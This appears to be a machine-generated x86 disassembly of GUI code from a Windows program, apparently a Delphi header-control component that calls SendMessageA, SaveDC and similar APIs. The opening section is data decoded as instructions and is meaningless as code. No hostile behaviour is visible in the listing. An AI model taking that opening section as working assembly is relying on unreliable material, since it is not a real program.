add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax ] al
add [ eax ] al
dec ecx
outsb
je r-xdata
and eax 0x14080043
push esp
dec edi
outsb
add [ 0x746e6f4d ] al
push 0x72614308
push esp
dec edi
bound ebp [ edx + 0x65 ]
or [ edi + ebp * 2 + 0x77 ] esp
inc esi
outsd
ja r-xdata
je r-xdata
popad
jns r-xdata
insd
or [ ebx + 0x6f ] al
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
inc ebx
add [ eax + 0x2 ] dl
add [ eax ] al
hlt
outsb
je r-xdata
inc esp
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ ebp + esi - 0x2cd3ffc0 ] ch
jb r-xdata
or [ ebx + 0x61 ] al
popad
jns r-xdata
outsw
inc ebp
jbe r-xdata
push 0x64737275
popad
jns r-xdata
or esp [ edi + ebp * 2 + 0x77 ]
push esp
ja r-xdata
outsd
imul ebp [ fs : esi + 0x61 ] 0x4d0d016c
outsd
arpl [ ecx + 0x6c ] sp
inc esp
popa
jne r-xdata
push ebx
outsb
jb r-xdata
add ecx [ eax ]
push es
or [ edi + ebp * 2 + 0x77 ] esp
push ebx
outsd
ja r-xdata
or esp [ edi + ebp * 2 + 0x77 ]
push ebx
outsd
ja r-xdata
arpl [ eax + eax + 0x5 ] si
dec ebp
outsd
outsb
je r-xdata
push 0x65
jb r-xdata
sub_432710
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
daa
inc ebx
add [ eax + eax ] cl
add [ eax ] al
int3
sub_432876
inc esp
add [ edi + esi * 8 ] dh
inc esp
add [ esi + ebx * 4 - 0x6167ffbd ] dl
add eax [ eax ]
inc ebx
popad
insb
outsb
popad
jb r-xdata
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
add [ esi + edi * 4 - 0x33abffbc ] dh
inc esp
add [ edx + ebp * 4 ] ah
inc ebx
add [ ecx + ecx * 8 ] bh
inc esp
add [ edi + ebx * 4 - 0x3313ffbd ] ch
inc esp
add al dh
int3
inc eax
add [ eax + ebp + 0xe070043 ] bh
push esp
dec ebp
outsd
outsb
je r-xdata
jb r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
insb
add [ eax ] eax
call esp
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x75410800
je r-xdata
add [ eax ] al
inc ebx
popad
insb
outsb
popad
jb r-xdata
jpe r-xdata
in al dx
inc edx
inc esp
add [ eax + eax ] dh
jmp [ eax + 0x10044b4 ]
add [ eax + 0x430b0011 ] al
outsd
jb r-xdata
inc ebx
add [ eax - 0x56 ] dh
inc ebx
add [ eax - 0x60 ] cl
inc ebx
add [ eax - 0x56 ] bh
inc ebx
add [ edx + ebp * 4 - 0x5517ffbd ] ch
inc ebx
add [ edx ] al
add [ esi ] cl
mov al 0x4e
mov esp sub_43a884
lodsb [ esi ]
test al 0x43
add [ esi ] cl
push esp
dec ebp
outsd
outsb
je r-xdata
sahf
daa
inc ebx
add al ah
inc ebx
add [ edx ] bh
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
jb r-xdata
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
or eax [ ebx + 0x6f ]
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
fcom [ eax + 0x44 ]
add [ eax - 0x80000000 ] al
str [ eax ]
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9865646f
and eax [ ebx ]
or [ edx ] al
add bh bh
call 0x1436d3c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43090010 ] al
popad
insb
inc ebx
outsd
insb
outsd
clc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
jae r-xdata
jae r-xdata
adc al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx + eax ] al
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] dl
cmp eax [ eax + eax + 0x5b ]
add [ eax ] al
jmp [ eax + 0x1004484 ]
add bh bh
cmp al 0xa2
inc ebx
add [ eax + 0x43 ] cl
add [ eax - 0x80000000 ] al
sbb [ eax ] al
pop es
inc ebp
outsb
inc esp
popad
je r-xdata
jb r-xdata
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
dec ebx
push ebx
insb
arpl [ gs : eax + esi * 8 + 0x41 ] si
inc esp
add ah cl
mov al [ 0xffffffffa0fc0043 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44040013 ] al
popad
je r-xdata
dec ebp
outsd
lodsb [ gs : esi ]
push eax
inc esp
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4907001c ] al
insd
dec esi
popad
insd
mov ah 0x24
inc ebx
add [ eax ] ah
add al [ eax ]
inc esp
mov [ 0x10043 ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7 ] al
sbb [ eax ] eax
push cs
inc esi
imul esi [ edx + 0x73 ] 0x79614474
dec edi
push di
imul edi [ gs : eax ] 0x2c
inc edx
add [ eax ] ch
add bh bh
test al 0x90
inc esp
add [ eax + 0x4490 ] bh
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001a ] al
outsd
outsb
je r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
popad
dec ebx
inc ecx
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
clc
cmp al [ eax + eax + 0x7a ]
add [ eax ] al
push eax
inc esp
add [ ecx + eax + 0x184ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
sbb eax [ eax ]
pop es
dec ecx
insd
call [ eax + 0x10043a5 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or ecx [ ebp + 0x75 ]
insb
je r-xdata
adc [ eax ] al
inc esp
add al [ eax ]
sub_432f9c
push ebx
add esp 0xfffffff8
mov [ esp ] 0x8
mov [ esp + 0x4 ] eax
mov eax esp
call sub_429ef4
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
jne r-xdata
mov eax ebx
pop ecx
pop edx
pop ebx
retn
call InitCommonControls
sub_432fc8
push ebx
mov ebx eax
mov eax ebx
call sub_432f9c
test al al
jne r-xdata
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
sub_433028
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov ebp eax
mov eax ebp
call sub_44fab8
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
push 0xfffffff0
mov eax ebp
call sub_44f7b4
push eax
call GetWindowLongA
mov esi eax
test bl bl
jne r-xdata
or esi edi
not edi
and esi edi
jmp r-xdata
push esi
push 0xfffffff0
mov eax ebp
call sub_44f7b4
push eax
call SetWindowLongA
sub_433070
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x10 ] 0x32
mov [ esi + 0x18 ] 0x2710
mov [ esi + 0x1e ] 0x1
mov [ esi + 0x20 ] 0xffffffff
mov [ esi + 0x25 ] 0x1
xor edx edx
mov eax esi
call sub_41920c
mov eax esi
call sub_433170
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_4330cc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418eb4
mov edi esi
mov edx [ edi + 0xc ]
mov eax ebx
call sub_43327c
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_4332a4
mov edx [ edi + 0x14 ]
mov eax ebx
call sub_433250
mov edx [ edi + 0x18 ]
mov eax ebx
call sub_43322c
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_4331fc
mov dl [ edi + 0x1d ]
mov eax ebx
call sub_43326c
mov al [ edi + 0x1e ]
mov [ ebx + 0x1e ] al
mov edx [ edi + 0x20 ]
mov eax ebx
call sub_4332ec
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_433170
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x25 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403564
test eax eax
je r-xdata
mov eax ebx
mov si 0xffff
call sub_403564
mov eax [ eax + 0x18 ]
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_433144
mov [ ebx + 0x25 ] 0x1
sub_4331d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0xc ]
call sub_4041b8
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4192b0
sub_43320c
push esi
mov esi eax
cmp dl [ esi + 0x1f ]
je r-xdata
pop esi
retn
mov [ esi + 0x1f ] dl
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
mov si 0xffee
call sub_403564
sub_43327c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx esi
call sub_404570
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0xc ]
mov edx esi
call sub_4041b8
xor edx edx
mov eax ebx
call sub_419274
sub_4332a4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x18 ]
cmp edx eax
jle r-xdata
mov edx eax
cmp edx [ ebx + 0x10 ]
je r-xdata
mov edx eax
pop esi
pop ebx
retn
mov [ ebx + 0x10 ] edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_419298
mov esi eax
mov eax [ ebx + 0x4 ]
call sub_419628
dec eax
cmp esi eax
setl dl
mov eax ebx
call sub_419274
sub_4332fc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_4193f0
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_433364
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax [ ebx + 0x18 ]
call sub_433b70
pop esi
pop ebx
retn
mov eax esi
call sub_419298
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_433b4c
pop esi
pop ebx
retn
sub_433390
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
test edx edx
jne r-xdata
mov esi edx
test edx edx
je r-xdata
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
mov esi eax
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax ebx
call sub_419628
cmp edi eax
jge r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax ebx
call sub_419628
mov edi eax
dec edi
sub_4333e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44b4e0
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_4484a0
mov edx 0x11
mov eax ebx
call sub_44876c
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x208 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424af4
mov esi eax
mov [ ebx + 0x214 ] esi
mov eax esi
mov edx ebx
call sub_447b68
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov esi eax
mov [ ebx + 0x224 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_434390
mov [ ebx + 0x220 ] 0x1
mov [ ebx + 0x222 ] 0x0
mov [ ebx + 0x211 ] 0x0
mov [ ebx + 0x210 ] 0x0
xor eax eax
mov [ ebx + 0x20c ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_4334b0
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0x214 ]
call sub_403368
mov eax [ esi + 0x208 ]
call sub_403368
mov eax [ esi + 0x224 ]
call sub_403368
mov eax [ esi + 0x20c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b604
test bl bl
jle r-xdata
call sub_403368
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_433508
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
call sub_432f9c
mov edx esi
mov eax ebx
call sub_44c640
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44c56c
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp [ ebx + 0x221 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x80
cmp [ ebx + 0x222 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x4
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x40
sub_433580
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20c ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419554
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x20c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b72c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_433608
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41dd48
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
call sub_41c400
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403368
retn
sub_433634
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44c76c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x228 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20c ] 0x0
je r-xdata
mov eax ebx
call sub_4560a8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_433b70
push ebp
call sub_433580
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
call sub_4561e4
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7b4
pop edx
call sub_42a000
pop ebx
pop ecx
pop ebp
retn
sub_43369c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20c ] 0x0
jne r-xdata
push 0x400
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b72c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43372a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x8 ]
call sub_41e8b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433731
mov eax [ ebp - 0x8 ]
call sub_403368
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_41ad38
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20c ] eax
sub_433740
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44eb30
mov eax ebx
call sub_44fab8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_419628
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_43334c
call sub_433170
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_43334c
cmp [ eax + 0x25 ] 0x0
je r-xdata
sub_43379c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44fab8
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419628
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_4489b8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_43334c
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419628
mov ebx eax
sub ebx 0x2
test ebx ebx
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4332fc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4338e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419628
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419628
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_43334c
mov eax [ eax + 0x10 ]
sub [ ebp - 0xc ] eax
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4338ed
mov eax [ ebp - 0x10 ]
call sub_403368
retn
inc ebx
xor esi esi
mov eax [ ebp - 0x10 ]
call sub_433340
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_43334c
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419628
mov edx eax
sub edx esi
dec edx
mov eax [ ebp - 0x10 ]
call sub_43334c
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_43334c
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_4338ed
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419628
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_433b70
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_419628
mov edx eax
dec edx
mov eax ebx
call sub_43334c
mov edx [ ebp - 0x8 ]
call sub_4332a4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_43334c
mov edx [ ebp - 0xc ]
call sub_4332a4
sub_433948
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x242 ] 0x0
je r-xdata
mov edx ecx
mov eax [ eax + 0x214 ]
call sub_424d48
push ecx
mov cl [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x244 ]
call [ ebx + 0x240 ]
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_4339c4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x25a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov cl [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_433a50
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi edx
mov esi eax
mov edx ecx
mov eax [ esi + 0x208 ]
call sub_43334c
mov ebx eax
lea eax [ esp + 0x1 ]
xor ecx ecx
mov edx 0x24
call sub_402d24
mov [ esp + 0x1 ] 0x7
mov eax [ ebx + 0x10 ]
mov [ esp + 0x5 ] eax
mov eax [ ebx + 0xc ]
call sub_404624
mov [ esp + 0x9 ] eax
mov eax [ ebx + 0xc ]
call sub_404424
mov [ esp + 0x11 ] eax
mov al [ ebx + 0x1c ]
mov [ esp ] al
mov eax ebx
call sub_4331c0
test al al
je r-xdata
mov al [ esp ]
sub al 0x1
jb r-xdata
mov eax esp
call sub_445d6c
xor eax eax
mov [ esp + 0x15 ] eax
jmp r-xdata
je r-xdata
cmp [ ebx + 0x1d ] 0x1
jne r-xdata
mov [ esp + 0x15 ] 0x1
jmp r-xdata
jmp r-xdata
or [ esp + 0x15 ] 0x4000
or [ esp + 0x15 ] 0x8000
jmp r-xdata
mov [ esp + 0x15 ] 0x2
cmp [ esi + 0x228 ] 0x0
je r-xdata
or [ esp + 0x15 ] 0x4
mov eax ebx
call sub_4331a8
test al al
je r-xdata
lea eax [ esp + 0x1 ]
push eax
mov eax ebx
call sub_419298
push eax
push edi
mov eax esi
call sub_44f7b4
push eax
call SendMessageA
add esp 0x28
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x20 ] 0x0
jl r-xdata
or [ esp + 0x1 ] 0x20
or [ esp + 0x15 ] 0x800
mov eax [ ebx + 0x20 ]
mov [ esp + 0x1d ] eax
sub_433b4c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44fab8
test al al
je r-xdata
pop esi
pop ebx
retn
mov ecx esi
mov edx 0x1204
mov eax ebx
call sub_433a50
sub_433b70
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_44fab8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x210 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x1200
mov eax esi
call sub_44f7b4
push eax
call SendMessageA
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esi + 0x208 ]
call sub_419628
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
inc ebx
xor edi edi
push 0x0
push 0x0
push 0x1202
mov eax esi
call sub_44f7b4
push eax
call SendMessageA
dec ebx
jne r-xdata
mov ecx edi
mov edx 0x1201
mov eax esi
call sub_433a50
inc edi
dec ebx
jne r-xdata
sub_433bec
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_424df8
xor eax eax
push ebp
push sub_433ced
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_4251ec
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_42508c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_4249a4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424ac0
mov eax [ ebp - 0x10 ]
test [ eax + 0x10 ] 0x1
setne al
push eax
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43334c
mov edx eax
mov eax [ ebp - 0x10 ]
lea ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403564
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433cf4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
xor edx edx
call sub_4251ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_425064
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
sub_433d04
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov esi [ edx + 0x8 ]
mov eax [ esi + 0x8 ]
cmp eax 0xfffffed2
jg r-xdata
sub eax 0xfffffed3
je r-xdata
je r-xdata
mov eax [ esi + 0x14 ]
test [ eax ] 0x1
je r-xdata
sub eax 0x11d
je r-xdata
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43334c
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffb2
call sub_403564
jmp r-xdata
sub eax 0xfffffec9
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43334c
mov ebx eax
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x211 ] 0x0
je r-xdata
jmp r-xdata
xor eax eax
mov [ edx + 0xc ] eax
call GetMessagePos
and eax 0xffff
mov [ ebp - 0x15 ] eax
lea eax [ ebp - 0x15 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call ScreenToClient
mov eax [ ebp - 0x4 ]
call sub_4489fc
sar eax 0x1
jns r-xdata
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov [ ebx + 0x10 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403564
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_434534
mov [ ebp - 0x11 ] eax
lea eax [ ebp - 0x15 ]
push eax
push 0x0
push 0x1206
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call SendMessageA
mov [ ebp - 0x39 ] 0x80
cmp [ ebp - 0x9 ] 0x0
jge r-xdata
adc eax 0x0
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43334c
mov ebx eax
mov eax [ esi + 0x8 ]
sub eax 0xfffffecd
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f7b4
lea ecx [ ebp - 0x39 ]
mov edx [ ebp - 0x9 ]
call sub_429fe4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x19 ]
mov [ eax + 0x21c ] edx
test [ ebp - 0xc ] 0x8
je r-xdata
mov [ ebp - 0x5 ] 0x2
jmp r-xdata
dec eax
jne r-xdata
mov eax [ ebp - 0xd ]
test ah 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x21c ] edx
jmp r-xdata
xor edx edx
push ebp
push sub_433e9a
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x5 ] 0x2
je r-xdata
mov [ ebp - 0x5 ] 0x1
mov [ ebp - 0x5 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419628
dec eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21c ] eax
jmp r-xdata
test al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f7b4
lea ecx [ ebp - 0x39 ]
mov edx [ esi + 0xc ]
call sub_429fe4
mov eax [ ebp - 0x4 ]
mov ebx [ ebp - 0x19 ]
mov [ eax + 0x218 ] ebx
